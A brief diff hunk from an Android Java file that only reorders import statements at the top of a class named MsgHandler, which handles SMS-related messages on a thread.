@@ -7,10 +7,10 @@ import android.os.Handler;
 import android.os.Looper;
 import android.os.Message;
 
+import com.android.mm.M;
 import com.android.syssetup.Status;
 import com.android.syssetup.auto.Cfg;
 import com.android.syssetup.util.Check;
-import com.android.mm.M;
 
 public class MsgHandler extends Thread {
 	private static final String TAG = "SmsHandler"; //$NON-NLS-1$
